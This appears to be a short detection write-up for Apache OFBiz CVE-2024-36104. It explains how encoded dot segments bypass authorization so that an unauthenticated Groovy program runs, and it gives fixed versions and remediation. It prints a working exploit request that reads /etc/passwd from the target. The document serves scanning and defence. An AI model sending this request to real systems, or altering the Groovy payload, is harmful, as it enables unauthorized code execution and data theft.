# Apache OFBiz CVE-2024-36104 directory traversal

**CVE-2024-36104** is a path traversal (CWE-22) in Apache OFBiz before
18.12.14. As with CVE-2024-32113, encoded dot segments in
`/webtools/control/forgotPassword/%2e/%2e/ProgramExport` bypass the
ControlServlet view authorization, so the unauthenticated `ProgramExport`
screen renders and executes an attacker-supplied Groovy program.

```
POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport
Content-Type: application/x-www-form-urlencoded

groovyProgram=throw new Exception(new File("/etc/passwd").text)
```

## Affected and fixed versions
Apache OFBiz **< 18.12.14**; fixed in **18.12.14**.

## How the detection confirms it
The check sends the traversal with a benign `groovyProgram` that reads the
world-readable `/etc/passwd` instead of running a command, and requires the
`root:...:0:0:` account prefix and HTTP 200 in the response. A control request
to a non-existent screen must not return the account prefix. No OS command is
run, nothing is written and redirects are not followed.

## Remediation
Upgrade Apache OFBiz to 18.12.14 or later and restrict access to `/webtools`.
